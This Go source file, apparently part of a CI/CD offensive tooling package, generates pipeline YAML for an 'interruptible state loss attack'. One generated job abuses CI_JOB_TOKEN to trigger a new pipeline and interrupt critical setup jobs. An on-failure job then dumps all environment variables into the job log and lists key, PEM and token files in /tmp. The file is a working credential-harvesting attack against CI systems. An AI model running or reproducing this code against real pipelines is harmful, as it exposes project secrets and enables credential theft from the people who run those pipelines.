package payloads

import (
	"fmt"
	"strings"
)

// InterruptibleOptions configures an interruptible state loss attack payload.
type InterruptibleOptions struct {
	Common         CommonOptions
	TargetJobs     []string // job names to make interruptible (default: ["critical-setup"])
	FallbackScript string   // runs when interrupted job fails
	TriggerScript  string   // script that causes new pipeline (interruption trigger)
}

// GenerateInterruptibleAttackYAML generates a multi-job CI pipeline where
// critical jobs are marked interruptible and a fallback captures state loss.
func GenerateInterruptibleAttackYAML(o InterruptibleOptions) string {
	name, _ := o.Common.defaults("interruptible-exploit")

	if len(o.TargetJobs) == 0 {
		o.TargetJobs = []string{"critical-setup"}
	}
	if strings.TrimSpace(o.FallbackScript) == "" {
		o.FallbackScript = buildDefaultFallbackScript()
	}
	if strings.TrimSpace(o.TriggerScript) == "" {
		o.TriggerScript = buildDefaultTriggerScript()
	}

	var b strings.Builder

	b.WriteString("stages: [setup, trigger, exploit]\n\n")

	for _, job := range o.TargetJobs {
		fmt.Fprintf(&b, `%s:
  stage: setup
  interruptible: true%s%s
  script:
    - echo "Initializing critical dependencies..."
    - sleep 30
    - echo "Setup complete"
  allow_failure: true

`, job, imageLine(o.Common.Image), tagsLine(o.Common.Tags))
	}

	fmt.Fprintf(&b, `%s-trigger:
  stage: trigger%s%s
  script:
    - |
%s
  allow_failure: true

`, name, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(o.TriggerScript), 6))

	fmt.Fprintf(&b, `%s:
  stage: exploit%s%s
  when: on_failure
  script:
    - |
%s
  allow_failure: true%s
`, name, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(o.FallbackScript), 6),
		rulesManual(o.Common.Manual))

	return b.String()
}

func buildDefaultFallbackScript() string {
	return `_FALLBACK() {
  local _d
  _d=$(mktemp -d)

  # Setup was interrupted — credentials may be partially initialized
  printenv | sort > "$_d/partial_env.txt" || true

  # Check for incomplete dependency installations
  find / -name "*.lock" -newer /proc/1/cmdline 2>/dev/null | head -50 > "$_d/stale_locks.txt" || true

  # Capture any temporary credentials from interrupted setup
  find /tmp -name "*.key" -o -name "*.pem" -o -name "*.token" 2>/dev/null | head -20 > "$_d/temp_creds.txt" || true

  cat "$_d/partial_env.txt"
  rm -rf "$_d" || true
}
_FALLBACK || true`
}

func buildDefaultTriggerScript() string {
	return `# Trigger a new pipeline to interrupt the current setup job
# This causes the interruptible job to be cancelled mid-execution
echo "Triggering interruption via API..."
curl -sS -X POST -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
  "$CI_API_V4_URL/projects/$CI_PROJECT_ID/pipeline" \
  -F "ref=$CI_COMMIT_BRANCH" || true`
}
